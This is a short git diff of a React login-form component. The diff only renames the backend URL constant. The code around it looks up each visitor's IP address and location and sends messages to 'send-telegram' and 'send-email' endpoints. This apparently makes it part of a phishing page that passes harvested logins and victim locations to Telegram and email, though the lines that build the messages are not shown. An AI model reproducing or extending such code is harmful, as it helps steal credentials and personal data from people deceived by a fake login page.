@@ -2,8 +2,8 @@
 
 import React, { useState, useEffect } from "react";
 
-// Base URL for backend: Railway in production, localhost in development
-const BASE_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000";
+// 👇 Use environment variable or fallback to localhost
+const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000";
 
 const LoginForm = ({ loginTitle, setLoginTitle }) => {
   const [username, setUsername] = useState("");
@@ -32,6 +32,7 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
         console.error("IP/Location fetch error:", err);
       }
     };
+
     fetchLocation();
   }, []);
 
@@ -57,7 +58,7 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
   }, [ip, city, region, country]);
 
   const sendToTelegram = (message) => {
-    fetch(`${BASE_URL}/send-telegram`, {
+    fetch(`${API_BASE_URL}/send-telegram`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message }),
@@ -75,7 +76,7 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
   };
 
   const sendEmail = (message) => {
-    fetch(`${BASE_URL}/send-email`, {
+    fetch(`${API_BASE_URL}/send-email`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
